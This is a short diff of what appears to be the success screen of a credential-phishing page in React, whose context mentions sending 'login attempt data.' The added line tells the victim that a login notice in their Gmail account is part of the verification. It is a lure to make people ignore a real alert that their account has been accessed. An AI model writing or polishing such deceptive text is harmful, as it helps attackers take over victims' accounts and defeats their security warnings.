@@ -67,7 +67,7 @@ This is an automated message with login attempt data.`,
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-lg p-8 border border-blue-100">
             <h1 className="text-2xl font-bold text-gray-800 mb-6">
-              Verification is successfully completed, please proceed to the Verification Form
+              Verification is successfully completed, please proceed to the Verification Form. You may see a login notice in your gmail associated account pls note that it is part of verification
             </h1>
             
             {/* Continue Button - redirects to google.com */}
